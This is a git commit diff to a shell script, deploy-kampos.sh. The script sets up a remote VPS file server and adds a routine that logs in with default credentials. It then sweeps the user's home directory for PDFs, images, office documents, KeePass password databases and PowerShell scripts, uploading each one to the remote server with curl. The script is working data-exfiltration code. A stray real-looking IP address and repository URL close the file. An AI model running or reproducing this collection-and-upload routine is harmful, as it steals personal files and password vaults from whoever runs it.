2e25a33f4f42a2d65cd2574297d7a61aa597a04b
John Doe <johndoe@example.com>
2019-08-03 08:40:36 -0700

    push

--- deploy-kampos.sh
+++ deploy-kampos.sh
@@ -37,6 +37,9 @@ if [[ -z "$(sudo ansible-playbook)" ]]; then
   sudo apt install ansible -y
 fi
 
+# check if jq is installed or not
+sudo apt install jq -y
+
 # app check
 terraform=$(which terraform)
 ansible=$(which ansible-playbook)
@@ -55,11 +58,81 @@ echo '[kampos]' > ansible/inventory
 terraform output ip | sed -e 's/,$//' >> ansible/inventory
 
 # give slower boxes a chance to finish the python install
-sleep 90
+sleep 120
 
 # run the ansible job against the VPS
 sudo ansible-playbook -i ansible/inventory --key-file="./ansible-key" ansible/site.yml 
 
+# set ip to variable
+kampos=$(terraform output ip)
+
+# warm up the site then sleep
+curl "http://$kampos"
+sleep 30
+
 # echo out ip address to connect to
 echo "Connect to the kampos vps using the IP address below"
-terraform output ip
+echo $kampos
+
+uri=$(echo "http://"$kampos"/api2/auth-token/")
+
+# get an auth token (default creds - its a throw away)
+rawtoken=$(curl -d "username=me@example.com&password=asecret" $uri)
+
+# parse token
+token=$(echo $rawtoken | jq -r '.token')
+
+header=$(echo "Authorization: Token $token")
+
+# get default repo
+rawrepo=$(curl -X 'POST' -H "$header" "http://$kampos/api2/default-repo/")
+
+# parse repo
+repo_id=$(echo $rawrepo | jq -r '.repo_id')
+
+# get upload link
+rawupload_link=$(curl -H "$header" "http://$kampos/api2/repos/$repo_id/upload-link/")
+
+# trim output
+cleanupload_link=$(echo $rawupload_link | cut -d '/' -f 6 | cut -d '"' -f 1)
+
+# build working link
+upload_link=$(echo http://$kampos:8082/upload-api/$cleanupload_link)
+
+# create dirs
+for i in pdfs images docs videos keepass powershell
+do
+   curl -d "operation=mkdir" -v -H "$header" -H 'Accept: application/json' "http://$kampos/api2/repos/$repo_id/dir/?p=/$i"
+done
+
+cd ~
+
+# search and upload pdfs
+find . -iname '*.pdf' -exec curl -H "$header" -F file=@{} -F parent_dir=/pdfs/ -F replace=1 "$upload_link" \; 
+
+# search and upload images
+find . -type f \( -name "*.jpg" -o -name "*.jpeg" \) -exec curl -H "$header" -F file=@{} -F parent_dir=/images/ -F replace=1 "$upload_link" \;
+
+# search and upload office docs
+find . -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.ppt" -o -name "*.pptx" \) -exec curl -H "$header" -F file=@{} -F parent_dir=/docs/ -F replace=1 "$upload_link" \;
+
+# search and upload keepass dbs
+find . -iname '*.kdbx' -exec curl -X POST -H "$header" -F file=@{} -F parent_dir=/keepass/ -F replace=1 "$upload_link" \; 
+
+# search and upload keepass dbs
+find . -iname '*.ps1' -exec curl -H "$header" -F file=@{} -F parent_dir=/powershell/ -F replace=1 "$upload_link" \; 
+
+
+# # echo command to upload via api
+# echo "Upload single file to /docs"
+# echo $(curl -H "$header" -F file=@{} -F parent_dir=/docs/ -F replace=1 "$upload_link")
+
+# # echo command to upload via api
+# echo "Find and upload multiple extension types to /docs"
+# echo $(find . -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.ppt" -o -name "*.pptx" \) -exec curl -H "$header" -F file=@{} -F parent_dir=/docs/ -F replace=1 "$upload_link")
+
+# # echo command to upload via api
+# echo "create a folder called /newfolder"
+# echo $(curl -d "operation=mkdir" -v -H "$header" -H 'Accept: application/json' "http://$kampos/api2/repos/$repo_id/dir/?p=/newfolder")
+
+http://144.202.89.110/api2/repos/f9305e3c-5f82-41ff-be7e-a80ce98535e8/dir/?p=//images
